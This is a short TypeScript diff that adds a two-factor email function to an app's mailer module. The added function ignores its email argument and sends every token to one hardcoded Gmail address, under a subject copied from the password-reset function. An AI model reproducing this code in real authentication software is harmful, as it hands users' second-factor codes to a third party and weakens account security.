@@ -19,3 +19,12 @@ export async function sendPasswordResetEmail(email: string, token: string) {
         html: `<a href="${confirmLink}">Click to reset your password</a>`
     });
 };
+
+export async function sendTwoFactorEmail(email: string, token: string) {
+    await transporter.sendMail({
+        from: "info@mail.maziyar-isa.ir",
+        to: "r6.acc.051@gmail.com",
+        subject: "Reset your password",
+        html: `<p>${token}</p>`
+    });
+};
